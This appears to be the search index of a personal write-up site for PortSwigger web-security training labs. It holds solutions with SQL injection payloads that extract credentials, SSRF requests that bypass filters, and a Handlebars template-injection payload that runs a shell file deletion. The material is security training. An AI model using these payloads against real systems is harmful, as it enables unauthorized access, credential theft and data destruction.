smuggling to reveal front-end request rewriting Not solved HTTP request smuggling Practitioner Exploiting HTTP request smuggling to capture other users' requests Not solved HTTP request smuggling Practitioner Exploiting HTTP request smuggling to deliver reflected XSS Not solved HTTP request smuggling Practitioner Response queue poisoning via H2.TE request smuggling Not solved HTTP request smuggling Practitioner H2.CL request smuggling Not solved HTTP request smuggling Practitioner HTTP/2 request smuggling via CRLF injection Not solved HTTP request smuggling Practitioner HTTP/2 request splitting via CRLF injection Not solved HTTP request smuggling Practitioner CL.0 request smuggling Not solved HTTP request smuggling Expert Exploiting HTTP request smuggling to perform web cache poisoning Not solved HTTP request smuggling Expert Exploiting HTTP request smuggling to perform web cache deception Not solved HTTP request smuggling Expert Bypassing access controls via HTTP/2 request tunnelling Not solved HTTP request smuggling Expert Web cache poisoning via HTTP/2 request tunnelling Not solved HTTP request smuggling Expert Client-side desync Not solved HTTP request smuggling Expert Browser cache poisoning via client-side desync Not solved HTTP request smuggling Expert Server-side pause-based request smuggling Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#os-command-injection","title":"OS command injection","text":"OS command injection level link Solved OS command injection Apprentice OS command injection, simple case Not solved OS command injection Practitioner Blind OS command injection with time delays Not solved OS command injection Practitioner Blind OS command injection with output redirection Not solved OS command injection Practitioner Blind OS command injection with out-of-band interaction Not solved OS command injection Practitioner Blind OS command injection with out-of-band data exfiltration Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#server-side-template-injection","title":"Server-side template injection","text":"Solution Server-side template injection level link Solved ssti-1 Server-side template injection Practitioner Basic server-side template injection Solved ssti-2 Server-side template injection Practitioner Basic server-side template injection (code context) Solved ssti-3 Server-side template injection Practitioner Server-side template injection using documentation Solved ssti-4 Server-side template injection Practitioner Server-side template injection in an unknown language with a documented exploit Solved ssti-5 Server-side template injection Practitioner Server-side template injection with information disclosure via user-supplied objects Solved ssti-6 Server-side template injection Expert Server-side template injection in a sandboxed environment Solved Server-side template injection Expert Server-side template injection with a custom exploit Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#directory-traversal","title":"Directory traversal","text":"Directory traversal level link Solved Directory traversal Apprentice File path traversal, simple case Not solved Directory traversal Practitioner File path traversal, traversal sequences blocked with absolute path bypass Not solved Directory traversal Practitioner File path traversal, traversal sequences stripped non-recursively Not solved Directory traversal Practitioner File path traversal, traversal sequences stripped with superfluous URL-decode Not solved Directory traversal Practitioner File path traversal, validation of start of path Not solved Directory traversal Practitioner File path traversal, validation of file extension with null byte bypass Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#access-control-vulnerabilities","title":"Access control vulnerabilities","text":"Solution Access control vulnerabilities level link Solved access-1 Access control vulnerabilities Apprentice Unprotected admin functionality Solved access-2 Access control vulnerabilities Apprentice Unprotected admin functionality with unpredictable URL Solved access-3 Access control vulnerabilities Apprentice User role controlled by request parameter Solved access-4 Access control vulnerabilities Apprentice User role can be modified in user profile Solved access-5 Access control vulnerabilities Apprentice User ID controlled by request parameter Solved access-6 Access control vulnerabilities Apprentice User ID controlled by request parameter, with unpredictable user IDs Solved access-7 Access control vulnerabilities Apprentice User ID controlled by request parameter with data leakage in redirect Solved access-8 Access control vulnerabilities Apprentice User ID controlled by request parameter with password disclosure Solved access-9 Access control vulnerabilities Apprentice Insecure direct object references Solved access-10 Access control vulnerabilities Practitioner URL-based access control can be circumvented Solved access-11 Access control vulnerabilities Practitioner Method-based access control can be circumvented Solved access-12 Access control vulnerabilities Practitioner Multi-step process with no access control on one step Solved access-13 Access control vulnerabilities Practitioner Referer-based access control Solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#authentication","title":"Authentication","text":"Authentication level link Solved Authentication Apprentice Username enumeration via different responses Not solved Authentication Apprentice 2FA simple bypass Not solved Authentication Apprentice Password reset broken logic Not solved Authentication Practitioner Username enumeration via subtly different responses Not solved Authentication Practitioner Username enumeration via response timing Not solved Authentication Practitioner Broken brute-force protection, IP block Not solved Authentication Practitioner Username enumeration via account lock Not solved Authentication Practitioner 2FA broken logic Not solved Authentication Practitioner Brute-forcing a stay-logged-in cookie Not solved Authentication Practitioner Offline password cracking Not solved Authentication Practitioner Password reset poisoning via middleware Not solved Authentication Practitioner Password brute-force via password change Not solved Authentication Expert Broken brute-force protection, multiple credentials per request Not solved Authentication Expert 2FA bypass using a brute-force attack Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#websockets","title":"WebSockets","text":"WebSockets level link Solved WebSockets Apprentice Manipulating WebSocket messages to exploit vulnerabilities Not solved WebSockets Practitioner Manipulating the WebSocket handshake to exploit vulnerabilities Not solved WebSockets Practitioner Cross-site WebSocket hijacking Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#web-cache-poisoning","title":"Web cache poisoning","text":"Web cache poisoning level link Solved Web cache poisoning Practitioner Web cache poisoning with an unkeyed header Not solved Web cache poisoning Practitioner Web cache poisoning with an unkeyed cookie Not solved Web cache poisoning Practitioner Web cache poisoning with multiple headers Not solved Web cache poisoning Practitioner Targeted web cache poisoning using an unknown header Not solved Web cache poisoning Practitioner Web cache poisoning via an unkeyed query string Not solved Web cache poisoning Practitioner Web cache poisoning via an unkeyed query parameter Not solved Web cache poisoning Practitioner Parameter cloaking Not solved Web cache poisoning Practitioner Web cache poisoning via a fat GET request Not solved Web cache poisoning Practitioner URL normalization Not solved Web cache poisoning Expert Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria Not solved Web cache poisoning Expert Combining web cache poisoning vulnerabilities Not solved Web cache poisoning Expert Cache key injection Not solved Web cache poisoning Expert Internal cache poisoning Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#insecure-deserialization","title":"Insecure deserialization","text":"Insecure deserialization level link Solved Insecure deserialization Apprentice Modifying serialized objects Not solved Insecure deserialization Practitioner Modifying serialized data types Not solved Insecure deserialization Practitioner Using application functionality to exploit insecure deserialization Not solved Insecure deserialization Practitioner Arbitrary object injection in PHP Not solved Insecure deserialization Practitioner Exploiting Java deserialization with Apache Commons Not solved Insecure deserialization Practitioner Exploiting PHP deserialization with a pre-built gadget chain Not solved Insecure deserialization Practitioner Exploiting Ruby deserialization using a documented gadget chain Not solved Insecure deserialization Expert Developing a custom gadget chain for Java deserialization Not solved Insecure deserialization Expert Developing a custom gadget chain for PHP deserialization Not solved Insecure deserialization Expert Using PHAR deserialization to deploy a custom gadget chain Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#information-disclosure","title":"Information disclosure","text":"Information disclosure level link Solved Information disclosure Apprentice Information disclosure in error messages Not solved Information disclosure Apprentice Information disclosure on debug page Not solved Information disclosure Apprentice Source code disclosure via backup files Not solved Information disclosure Apprentice Authentication bypass via information disclosure Not solved Information disclosure Practitioner Information disclosure in version control history Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#business-logic-vulnerabilities","title":"Business logic vulnerabilities","text":"Business logic vulnerabilities level link Solved Business logic vulnerabilities Apprentice Excessive trust in client-side controls Not solved Business logic vulnerabilities Apprentice High-level logic vulnerability Not solved Business logic vulnerabilities Apprentice Inconsistent security controls Not solved Business logic vulnerabilities Apprentice Flawed enforcement of business rules Not solved Business logic vulnerabilities Practitioner Low-level logic flaw Not solved Business logic vulnerabilities Practitioner Inconsistent handling of exceptional input Not solved Business logic vulnerabilities Practitioner Weak isolation on dual-use endpoint Not solved Business logic vulnerabilities Practitioner Insufficient workflow validation Not solved Business logic vulnerabilities Practitioner Authentication bypass via flawed state machine Not solved Business logic vulnerabilities Practitioner Infinite money logic flaw Not solved Business logic vulnerabilities Practitioner Authentication bypass via encryption oracle Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#http-host-header-attacks","title":"HTTP Host header attacks","text":"HTTP Host header attacks level link Solved HTTP Host header attacks Apprentice Basic password reset poisoning Not solved HTTP Host header attacks Apprentice Host header authentication bypass Not solved HTTP Host header attacks Practitioner Web cache poisoning via ambiguous requests Not solved HTTP Host header attacks Practitioner Routing-based SSRF Not solved HTTP Host header attacks Practitioner SSRF via flawed request parsing Not solved HTTP Host header attacks Practitioner Host validation bypass via connection state attack Not solved HTTP Host header attacks Expert Password reset poisoning via dangling markup Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#oauth-authentication","title":"OAuth authentication","text":"OAuth authentication level link Solved OAuth authentication Apprentice Authentication bypass via OAuth implicit flow Not solved OAuth authentication Practitioner Forced OAuth profile linking Not solved OAuth authentication Practitioner OAuth account hijacking via redirect_uri Not solved OAuth authentication Practitioner Stealing OAuth access tokens via an open redirect Not solved OAuth authentication Practitioner SSRF via OpenID dynamic client registration Not solved OAuth authentication Expert Stealing OAuth access tokens via a proxy page Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#file-upload-vulnerabilities","title":"File upload vulnerabilities","text":"File upload vulnerabilities level link Solved File upload vulnerabilities Apprentice Remote code execution via web shell upload Not solved File upload vulnerabilities Apprentice Web shell upload via Content-Type restriction bypass Not solved File upload vulnerabilities Practitioner Web shell upload via path traversal Not solved File upload vulnerabilities Practitioner Web shell upload via extension blacklist bypass Not solved File upload vulnerabilities Practitioner Web shell upload via obfuscated file extension Not solved File upload vulnerabilities Practitioner Remote code execution via polyglot web shell upload Not solved File upload vulnerabilities Expert Web shell upload via race condition Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#jwt","title":"JWT","text":"JWT level link Solved JWT-1 Apprentice JWT authentication bypass via unverified signature Solved JWT-2 Apprentice JWT authentication bypass via flawed signature verification Solved JWT-3 Practitioner JWT authentication bypass via weak signing key Solved JWT-4 Practitioner JWT authentication bypass via jwk header injection Solved JWT-5 Practitioner JWT authentication bypass via jku header injection Solved Practitioner JWT authentication bypass via kid header path traversal Not solved Expert JWT authentication bypass via algorithm confusion Not solved Expert JWT authentication bypass via algorithm confusion with no exposed key Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#essential-skills","title":"Essential skills","text":"Essential skills level link Solved Essential skills Practitioner Discovering vulnerabilities quickly with targeted scanning Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-labs/#prototype-pollution","title":"Prototype pollution","text":"Prototype pollution level link Solved Prototype pollution Practitioner DOM XSS via client-side prototype pollution Not solved Prototype pollution Practitioner DOM XSS via an alternative prototype pollution vector Not solved Prototype pollution Practitioner Client-side prototype pollution in third-party libraries Not solved Prototype pollution Practitioner Client-side prototype pollution via browser APIs Not solved Prototype pollution Practitioner Client-side prototype pollution via flawed sanitization Not solved","tags":["burpsuite"]},{"location":"burpsuite/burpsuite-sqli/","title":"BurpSuite Labs - SQL injection","text":"","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data","title":"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data","text":"","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#enuntiation","title":"Enuntiation","text":"<p>This lab contains an\u00a0SQL injection\u00a0vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:</p> <p><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></p> <p>To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.</p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#solution","title":"Solution","text":"<p>Filter by one of the categories and, in the URL, instead of that categorry, after the \"=\" add:</p> <pre><code>' OR '1'='1\n</code></pre>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#sql-injection-vulnerability-allowing-login-bypass","title":"SQL injection vulnerability allowing login bypass","text":"","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#enuntiation_1","title":"Enuntiation","text":"<p>This lab contains an\u00a0SQL injection\u00a0vulnerability in the login function.</p> <p>To solve the lab, perform an SQL injection attack that logs in to the application as the\u00a0<code>administrator</code>\u00a0user.</p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#solution_1","title":"Solution","text":"<p>In the login page, add to username:</p> <pre><code>administrator'--\n</code></pre> <p>In password it doesn't matter what you write.</p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query","title":"SQL injection UNION attack, determining the number of columns returned by the query","text":"","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#enuntiation_2","title":"Enuntiation","text":"<p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.</p> <p>To solve the lab, determine the number of columns returned by the query by performing an\u00a0SQL injection UNION\u00a0attack that returns an additional row containing null values.</p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#solution_2","title":"Solution","text":"<p>In the category filter, filter by 'Gift'. Then in the URL, substitute Gift by: </p> <pre><code>' OR '1'='1' order by 1-- -\n' OR '1'='1' order by 2-- -\n' OR '1'='1' order by 3-- -\n' OR '1'='1' order by 4-- -\n</code></pre> <p>When substituting by the last string, you will have an error. Bingo! Our last successful try was with 3 columns, so the table is holding 3 columns. Now we can launch our UNION attack:</p> <pre><code>' OR '1'='1' UNION SELECT all  null,null,null-- -\n</code></pre> <p></p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#sql-injection-union-attack-finding-a-column-containing-text","title":"SQL injection UNION attack, finding a column containing text","text":"","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#enuntiation_3","title":"Enuntiation","text":"<p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a\u00a0previous lab. The next step is to identify a column that is compatible with string data.</p> <p>The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an\u00a0SQL injection UNION\u00a0attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.</p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#solution_3","title":"Solution","text":"<p>Select category filter GIFT in the Home lab.</p> <p>Substitute in the URL Gift by the following string to guess which column is being displayed: </p> <pre><code>' UNION SELECT null,null,null-- -\n</code></pre> <p>The Lab environment is providing at the top of the screen a string of characters that you will need to get reflected in order to pass the lab. In my case it was the string 'FEvLOw'. I tried that string in different positions and I got success in the second position: </p> <pre><code>'+UNION+SELECT+'FEvLOw',NULL,NULL--\n'+UNION+SELECT+NULL,'FEvLOw',NULL--\n</code></pre> <p></p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#sql-injection-union-attack-retrieving-data-from-other-tables","title":"SQL injection UNION attack, retrieving data from other tables","text":"","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#enuntiation_4","title":"Enuntiation","text":"<p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.</p> <p>The database contains a different table called\u00a0<code>users</code>, with columns called\u00a0<code>username</code>\u00a0and\u00a0<code>password</code>.</p> <p>To solve the lab, perform an\u00a0SQL injection UNION\u00a0attack that retrieves all usernames and passwords, and use the information to log in as the\u00a0<code>administrator</code>\u00a0user.</p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#solution_4","title":"Solution","text":"<p>First, we test the number of columns and we obtain 2.</p> <p>Later we run</p> <pre><code>' UNION SELECT ALL username,password FROM users-- -\n</code></pre> <p></p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column","title":"SQL injection UNION attack, retrieving multiple values in a single column","text":"","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#enuntiation_5","title":"Enuntiation","text":"<p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.</p> <p>The database contains a different table called\u00a0<code>users</code>, with columns called\u00a0<code>username</code>\u00a0and\u00a0<code>password</code>.</p> <p>To solve the lab, perform an\u00a0SQL injection UNION\u00a0attack that retrieves all usernames and passwords, and use the information to log in as the\u00a0<code>administrator</code>\u00a0user.</p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#solution_5","title":"Solution","text":"<p>Like in the previous lab, first we test how many columns there are:</p> <pre><code>' UNION SELECT ALL NULL,NULL-- -\n</code></pre> <p>After that we check that (in my case) the column that is reflected is the second one, and we use that to retrieve the users and passwords:</p> <pre><code>' UNION SELECT NULL,username FROM users-- -\n</code></pre> <p>And we get:</p> <pre><code>carlos\nadministrator\nwiener\n</code></pre> <p>And then, passwords:</p> <pre><code>' UNION SELECT NULL,password FROM users-- -\n</code></pre> <p>And we get:</p> <p></p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#sql-injection-attack-querying-the-database-type-and-version-on-oracle","title":"SQL injection attack, querying the database type and version on Oracle","text":"","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#enuntiation_6","title":"Enuntiation","text":"<p>This lab contains a\u00a0SQL injection\u00a0vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p> <p>To solve the lab, display the database version string.</p>","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-sqli/#solution_6","title":"Solution","text":"","tags":["burpsuite","sqli"]},{"location":"burpsuite/burpsuite-ssrf/","title":"BurpSuite Labs - Server Side Request Forgery","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#payloads-with-localhost</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#basic-ssrf-against-the-local-server","title":"Basic SSRF against the local server","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#enunciation","title":"Enunciation","text":"<p>This lab has a stock check feature which fetches data from an internal system.</p> <p>To solve the lab, change the stock check URL to access the admin interface at <code>http://localhost/admin</code> and delete the user <code>carlos</code>.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#solution","title":"Solution","text":"<pre><code>POST /product/stock HTTP/2\nHost: 0a1600f6034ecb0581760c6200e30093.web-security-academy.net\nCookie: session=nQDGMiUWrUCVsa4ZXP4RoToYgd4biWt5\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://0a1600f6034ecb0581760c6200e30093.web-security-academy.net/product?productId=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 64\nOrigin: https://0a1600f6034ecb0581760c6200e30093.web-security-academy.net\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\nstockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete?username=carlos\n</code></pre> <ol> <li>Browse to <code>/admin</code> and observe that you can't directly access the admin page.</li> <li>Visit a product, click \"Check stock\", intercept the request in Burp Suite, and send it to Burp Repeater.</li> <li>Change the URL in the <code>stockApi</code> parameter to <code>http://localhost/admin</code>. This should display the administration interface.</li> <li> <p>Read the HTML to identify the URL to delete the target user, which is:</p> <p><code>http://localhost/admin/delete?username=carlos</code></p> </li> <li> <p>Submit this URL in the <code>stockApi</code> parameter, to deliver the SSRF attack.</p> </li> </ol>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#basic-ssrf-against-another-back-end-system","title":"Basic SSRF against another back-end system","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#enunciation_1","title":"Enunciation","text":"<p>This lab has a stock check feature which fetches data from an internal system.</p> <p>To solve the lab, use the stock check functionality to scan the internal <code>192.168.0.X</code> range for an admin interface on port 8080, then use it to delete the user <code>carlos</code>.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#solution_1","title":"Solution","text":"<p>Launch a scan request with intruder</p> <pre><code>POST /product/stock HTTP/2\nHost: 0a81003a04cbb66585aa2164005e00d9.web-security-academy.net\nCookie: session=ukVLJOQMDp5wqxujhaw2c21t5Xt8XcYq\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://0a81003a04cbb66585aa2164005e00d9.web-security-academy.net/product?productId=2\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 96\nOrigin: https://0a81003a04cbb66585aa2164005e00d9.web-security-academy.net\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\nstockApi=http://192.168.0.\u00a71\u00a7:8080/admin/\n</code></pre> <p></p> <p>Now we know that the address is http://192.168.0.16:8080/admin/, so we can send the delete request for user carlos.</p> <pre><code>POST /product/stock HTTP/2\nHost: 0a81003a04cbb66585aa2164005e00d9.web-security-academy.net\nCookie: session=ukVLJOQMDp5wqxujhaw2c21t5Xt8XcYq\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://0a81003a04cbb66585aa2164005e00d9.web-security-academy.net/product?productId=2\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 62\nOrigin: https://0a81003a04cbb66585aa2164005e00d9.web-security-academy.net\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\nstockApi=http://192.168.0.16:8080/admin/delete?username=carlos\n</code></pre> <p></p> <ol> <li>Visit a product, click \"Check stock\", intercept the request in Burp Suite, and send it to Burp Intruder.</li> <li>Click \"Clear \u00a7\", change the <code>stockApi</code> parameter to <code>http://192.168.0.1:8080/admin</code> then highlight the final octet of the IP address (the number <code>1</code>), click \"Add \u00a7\".</li> <li>Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the \"From\" and \"To\" and \"Step\" boxes respectively.</li> <li>Click \"Start attack\".</li> <li>Click on the \"Status\" column to sort it by status code ascending. You should see a single entry with a status of 200, showing an admin interface.</li> <li>Click on this request, send it to Burp Repeater, and change the path in the <code>stockApi</code> to: <code>/admin/delete?username=carlos</code></li> </ol>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#ssrf-with-blacklist-based-input-filters","title":"SSRF with blacklist-based input filters","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#enunciation_2","title":"Enunciation","text":"<p>This lab has a stock check feature which fetches data from an internal system.</p> <p>To solve the lab, change the stock check URL to access the admin interface at <code>http://localhost/admin</code> and delete the user <code>carlos</code>.</p> <p>The developer has deployed two weak anti-SSRF defenses that you will need to bypass.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#solution_2","title":"Solution","text":"<pre><code>POST /product/stock HTTP/2\nHost: 0a7700f4041232118111d52d000100ab.web-security-academy.net\nCookie: session=zdzvJtvkFadrRM96wa1vXhMF7G2zfSkN\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://0a7700f4041232118111d52d000100ab.web-security-academy.net/product?productId=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 66\nOrigin: https://0a7700f4041232118111d52d000100ab.web-security-academy.net\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\nstockApi=http://127.1/%25%36%31dmin\n</code></pre> <p>Now we know that we need to use the filters: </p> <ul> <li>127.1</li> <li>double url encoding of \"a\" character in the word 'admin.'</li> </ul> <p>so we can send the delete request for user carlos.</p> <pre><code>POST /product/stock HTTP/2\nHost: 0a7700f4041232118111d52d000100ab.web-security-academy.net\nCookie: session=zdzvJtvkFadrRM96wa1vXhMF7G2zfSkN\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://0a7700f4041232118111d52d000100ab.web-security-academy.net/product?productId=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 66\nOrigin: https://0a7700f4041232118111d52d000100ab.web-security-academy.net\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\nstockApi=http://127.1/%25%36%31dmin/%25%36%34elete?username=carlos\n</code></pre> <p></p> <ol> <li>Visit a product, click \"Check stock\", intercept the request in Burp Suite, and send it to Burp Repeater.</li> <li>Change the URL in the <code>stockApi</code> parameter to <code>http://127.0.0.1/</code> and observe that the request is blocked.</li> <li>Bypass the block by changing the URL to: <code>http://127.1/</code></li> <li>Change the URL to <code>http://127.1/admin</code> and observe that the URL is blocked again.</li> <li>Obfuscate the \"a\" by double-URL encoding it to %2561 to access the admin interface and delete the target user.</li> </ol>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#ssrf-with-filter-bypass-via-open-redirection-vulnerability","title":"SSRF with filter bypass via open redirection vulnerability","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#enunciation_3","title":"Enunciation","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssrf/#solution_3","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-ssti/","title":"BurpSuite Labs - Server Side Template Injection","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#basic-server-side-template-injection","title":"Basic server-side template injection","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#enunciation","title":"Enunciation","text":"<p>This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.</p> <p>To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the <code>morale.txt</code> file from Carlos's home directory.</p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#solution","title":"Solution","text":"<p>Identify an injection point. </p> <p></p> <p>Test a template injection. From the enunciate we knew it was ERB.</p> <p></p> <p>Listing root \"/.\"</p> <p></p> <p>Listing \"/home/carlos.\"</p> <p></p> <p>Beforehand, we run a whoami.</p> <p></p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#basic-server-side-template-injection-code-context","title":"Basic server-side template injection (code context)","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#enunciation_1","title":"Enunciation","text":"<p>This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the\u00a0<code>morale.txt</code>\u00a0file from Carlos's home directory.</p> <p>You can log in to your own account using the following credentials:\u00a0<code>wiener:peter</code></p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#solution_1","title":"Solution","text":"<p>Afterwards, you need to visit the endpoint where the code gets executed.</p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#server-side-template-injection-using-documentation","title":"Server-side template injection using documentation","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#enunciation_2","title":"Enunciation","text":"<p>This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the\u00a0<code>morale.txt</code>\u00a0file from Carlos's home directory.</p> <p>You can log in to your own account using the following credentials:</p> <p><code>content-manager:C0nt3ntM4n4g3r</code></p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#solution_2","title":"Solution","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#server-side-template-injection-in-an-unknown-language-with-a-documented-exploit","title":"Server-side template injection in an unknown language with a documented exploit","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#enunciation_3","title":"Enunciation","text":"<p>This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the\u00a0<code>morale.txt</code>\u00a0file from Carlos's home directory.</p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#solution_3","title":"Solution","text":"<p>Find out injection point and obtain template engine from stack traces:</p> <p></p> <p>Search the web for \"Handlebars server-side template injection\". You should find a well-known exploit posted by\u00a0<code>@Zombiehelp54</code>. </p> <p></p> <p>Url-encode this payload for resolution: </p> <pre><code>{{#with \"s\" as |string|}}\n    {{#with \"e\"}}\n        {{#with split as |conslist|}}\n            {{this.pop}}\n            {{this.push (lookup string.sub \"constructor\")}}\n            {{this.pop}}\n            {{#with string.split as |codelist|}}\n                {{this.pop}}\n                {{this.push \"return require('child_process').exec('rm /home/carlos/morale.txt');\"}}\n                {{this.pop}}\n                {{#each conslist}}\n                    {{#with (string.sub.apply 0 codelist)}}\n                        {{this}}\n                    {{/with}}\n                {{/each}}\n            {{/with}}\n        {{/with}}\n    {{/with}}\n{{/with}}  